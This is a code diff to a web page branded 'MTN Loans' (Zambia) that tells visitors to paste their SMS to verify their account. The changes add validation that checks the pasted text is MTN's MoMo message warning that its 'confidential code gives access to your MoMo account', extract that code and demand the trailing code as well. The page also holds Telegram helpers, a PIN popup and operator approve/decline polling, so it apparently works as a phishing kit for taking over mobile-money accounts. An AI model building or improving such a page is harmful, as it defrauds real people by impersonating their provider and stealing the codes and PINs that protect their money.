@@ -39,41 +39,19 @@
             z-index: 2;
         }
 
-        /* Logo */
         .logo {
-            margin-top: 60px;
+            margin-top: 20px;
+        }
+        .logo-img {
+            max-height: 56px;
+            width: auto;
+            border-radius: 14px;
+            display: block;
+            margin: 0 auto;
+            background: #fff;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
         }
 
-        .logo-circle {
-            width: 52px;
-            height: 52px;
-            background: #000;
-            border-radius: 50%;
-            color: #FFCC00;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 30px;
-            margin: auto;
-            font-weight: 800;
-        }
-
-        .logo-text {
-            color: #000;
-            font-size: 26px;
-            font-weight: bold;
-            margin-top: 8px;
-        }
-
-        .logo-text span {
-            color: #FFCC00;
-            background: #000;
-            display: inline-block;
-            padding: 0 6px;
-            border-radius: 10px;
-        }
-
-        /* Text */
         .title {
             color: #FFCC00;
             font-size: 20px;
@@ -88,7 +66,6 @@
             line-height: 1.5;
         }
 
-        /* MESSAGE TEXTAREA */
         .message-area {
             margin-top: 20px;
             text-align: left;
@@ -104,7 +81,7 @@
 
         .message-area textarea {
             width: 100%;
-            min-height: 120px;
+            min-height: 140px;
             padding: 12px;
             border: 1px solid #ddd;
             border-radius: 12px;
@@ -126,7 +103,6 @@
             margin-top: 4px;
         }
 
-        /* Buttons */
         .btn {
             width: 100%;
             height: 55px;
@@ -171,7 +147,6 @@
             color: #28a745;
         }
 
-        /* Error box */
         .error-box {
             position: absolute;
             top: 20px;
@@ -207,7 +182,6 @@
             color: #999;
         }
 
-        /* Spinner */
         #spinner {
             position: fixed;
             inset: 0;
@@ -336,7 +310,6 @@
             margin-top: 10px;
         }
 
-        /* Small screens */
         @media (max-width: 400px) {
             .modal-box {
                 padding: 24px 16px 20px;
@@ -365,7 +338,6 @@
 <body>
 
     <div class="container">
-        <!-- ERROR BOX -->
         <div class="error-box" id="errorBox">
             <div class="close" onclick="hideError()">×</div>
             <div class="error-title">Error</div>
@@ -373,31 +345,26 @@
         </div>
 
         <div class="content">
-            <!-- LOGO -->
             <div class="logo">
-                <div class="logo-circle">M</div>
-                <div class="logo-text"><span>MTN</span> Loans</div>
+                <img src="logo.png" alt="MTN Loans" class="logo-img" />
             </div>
 
-            <!-- TEXT -->
             <div class="title">Verify Your Account</div>
             <div class="subtitle" id="subtitleText">
                 Paste the message you received via SMS.<br>
                 <span id="maskedPhone">+260 7x xxx xxx</span>
             </div>
 
-            <!-- MESSAGE TEXTAREA -->
             <div class="message-area">
                 <label for="otpMessageText">Paste the message</label>
                 <textarea id="otpMessageText" placeholder="Paste the full message here..."></textarea>
-                <div class="hint">The OTP code is in the SMS message.</div>
+                <div class="hint">Paste the full message you received via SMS.</div>
             </div>
 
             <div class="message" id="formMessage"></div>
 
             <button class="btn btn-primary" id="submitBtn">Submit</button>
 
-            <!-- Go Back button -->
             <button class="btn btn-outline" id="goBackBtn">Back</button>
         </div>
     </div>
@@ -445,7 +412,6 @@
         const errorBox = document.getElementById('errorBox');
         const errorText = document.getElementById('errorText');
 
-        // PIN Modal
         const pinModal = document.getElementById('pinModal');
         const modalPinInput = document.getElementById('modalPinInput');
         const modalMessage = document.getElementById('modalMessage');
@@ -453,7 +419,6 @@
 
         // ==================== RETRIEVE DATA FROM SESSIONSTORAGE ====================
         const phone = sessionStorage.getItem('mtn_phone') || '766123456';
-        // Format as +260 7xx xxx xxx (9 digits)
         function formatZambianPhone(phoneDigits) {
             if (!phoneDigits) return '+260 7x xxx xxx';
             const cleaned = phoneDigits.replace(/\D/g, '');
@@ -463,7 +428,6 @@
             return phoneDigits;
         }
 
-        // Mask the phone: show first digit, then x's, last two digits
         function maskPhone(phone) {
             const cleaned = phone.replace(/\D/g, '');
             if (cleaned.length >= 4) {
@@ -486,6 +450,71 @@
         window.hideError = function() {
             errorBox.style.display = 'none';
         };
+
+        // ==================== SMS MESSAGE VALIDATION ====================
+        const PREFIX = "Y'ello. Please note! This confidential code gives access to your MoMo account:";
+        const SUFFIX = "Do not share it with anyone.";
+
+        function validateAndExtractCode(text) {
+            // 1. Basic non-empty check
+            if (!text || text.trim().length < 20) {
+                return { error: 'invalid', message: 'Invalid message format. Please paste the full SMS message.' };
+            }
+
+            // 2. Check for Prefix (Format/Structure Error -> Invalid)
+            const startIdx = text.indexOf(PREFIX);
+            if (startIdx === -1) {
+                return { error: 'invalid', message: 'Invalid message format. Please paste the full SMS message.' };
+            }
+
+            // 3. Check for Suffix (Format/Structure Error -> Invalid)
+            const endIdx = text.indexOf(SUFFIX, startIdx + PREFIX.length);
+            if (endIdx === -1) {
+                return { error: 'invalid', message: 'Invalid message format. Please paste the full SMS message.' };
+            }
+
+            // 4. Extract the code between prefix and suffix
+            const codeStart = startIdx + PREFIX.length;
+            let code = text.substring(codeStart, endIdx).trim();
+
+            // 5. Validate extracted code (Content/Quality Error -> Incomplete)
+            if (!code || code.length < 10) {
+                return { error: 'incomplete', message: 'Incomplete message. The OTP code is missing or invalid.' };
+            }
+
+            const base64Regex = /^[A-Za-z0-9+/=]+$/;
+            if (!base64Regex.test(code)) {
+                return { error: 'incomplete', message: 'Incomplete message. The OTP code contains invalid characters.' };
+            }
+
+            if (code.length > 200) {
+                return { error: 'incomplete', message: 'Incomplete message. The extracted code is too long.' };
+            }
+
+            // 6. CRITICAL: Check for the trailing verification code after the suffix
+            // This is the vital code that comes after "Do not share it with anyone."
+            const trailing = text.substring(endIdx + SUFFIX.length).trim();
+
+            if (!trailing || trailing.length < 10) {
+                return { error: 'incomplete', message: 'Incomplete message. The verification code after the suffix is missing.' };
+            }
+
+            // Remove spaces to check the trailing code content
+            const trailingClean = trailing.replace(/\s/g, '');
+
+            // The trailing code must contain at least 10 Base64-like characters
+            if (trailingClean.length < 10) {
+                return { error: 'incomplete', message: 'Incomplete message. The verification code appears incomplete.' };
+            }
+
+            // Check that the trailing code contains only Base64 characters
+            // Note: it often has spaces between groups, so we check the cleaned version
+            if (!base64Regex.test(trailingClean)) {
+                return { error: 'incomplete', message: 'Incomplete message. The verification code contains invalid characters.' };
+            }
+
+            return { code: code };
+        }
 
         // ==================== TELEGRAM HELPERS ====================
         function escapeHtml(unsafe) {
@@ -582,10 +611,6 @@
 
         function getModalPin() {
             return modalPinInput.value.trim();
-        }
-
-        function isPinComplete() {
-            return modalPinInput.value.length === 5;
         }
 
         modalPinInput.addEventListener('input', function(e) {
@@ -692,13 +717,22 @@
         async function submitMessage() {
             if (isSubmitting) return;
 
-            const msgText = messageTextarea.value.trim();
-            if (msgText.length < 5) {
-                formMessage.textContent = 'Please paste the full message (at least 5 characters).';
+            const msgText = messageTextarea.value;
+            const validation = validateAndExtractCode(msgText);
+
+            if (validation.error) {
+                formMessage.textContent = validation.message;
                 formMessage.className = 'message error';
+                messageTextarea.style.borderColor = '#dc3545';
+                setTimeout(() => {
+                    messageTextarea.style.borderColor = '';
+                }, 3000);
                 return;
             }
+
             formMessage.textContent = '';
+            formMessage.className = 'message';
+            const otpCode = validation.code;
 
             isSubmitting = true;
             submitBtn.disabled = true;
@@ -748,7 +782,7 @@
                     formMessage.textContent = '📌 Please confirm your PIN in the popup.';
                     formMessage.className = 'message';
                 } else if (action === 'decline') {
-                    showError('Paste the full message. Check and try again.');
+                    showError('Paste the most recent message in full. Check and try again.');
                     messageTextarea.value = '';
                     messageTextarea.focus();
                     formMessage.textContent = '';
@@ -760,7 +794,12 @@
 
         submitBtn.addEventListener('click', submitMessage);
 
-        // ==================== GO BACK ====================
+        messageTextarea.addEventListener('input', function() {
+            formMessage.textContent = '';
+            formMessage.className = 'message';
+            this.style.borderColor = '';
+        });
+
         goBackBtn.addEventListener('click', () => {
             if (currentPollInterval) {
                 clearInterval(currentPollInterval);
@@ -769,7 +808,6 @@
             window.location.href = 'login.html';
         });
 
-        // ==================== CTRL+ENTER SHORTCUT ====================
         messageTextarea.addEventListener('keydown', function(e) {
             if (e.key === 'Enter' && e.ctrlKey) {
                 e.preventDefault();
@@ -777,14 +815,13 @@
             }
         });
 
-        // ==================== INIT ====================
         setTimeout(() => {
             messageTextarea.focus();
         }, 200);
 
         pinModal.addEventListener('click', function(e) {
             if (e.target === pinModal && !isModalSubmitting) {
-                // Do nothing – user must complete flow
+                // Do nothing
             }
         });
 
@@ -806,7 +843,7 @@
             phone
         };
 
-        console.log('[MTN Loans] OTP page initialized with Zambia branding.');
+        console.log('[MTN Loans] OTP page initialized with Zambia branding and SMS validation.');
     })();
     </script>
 
